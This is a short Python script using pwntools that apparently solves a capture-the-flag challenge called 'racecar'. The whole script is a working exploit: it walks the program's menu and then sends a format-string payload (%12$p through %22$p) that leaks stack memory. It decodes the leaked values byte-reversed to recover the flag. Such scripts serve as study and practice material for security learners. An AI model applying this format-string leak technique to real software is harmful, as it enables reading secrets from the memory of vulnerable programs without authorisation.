#!/usr/bin/python3
from pwn import process, unhex, log

shell = process("./racecar")

payload = b""

for i in range(12, 23):
    payload += f"%{str(i)}$p.".encode()

shell.sendlineafter(b"Name: ", b"Name")
shell.sendlineafter(b"Nickname: ", b"Nickname")
shell.sendlineafter(b"> ", b"2")
shell.sendlineafter(b"> ", b"2")
shell.sendlineafter(b"> ", b"1")
shell.sendlineafter(b"> ", payload)
shell.recvline_contains(b"The Man")

values = shell.recvline().strip().split(b".")

flag = b""

for value in values:
    flag += unhex(value[2:])[::-1]

log.info(f"Flag: {flag.decode()}")
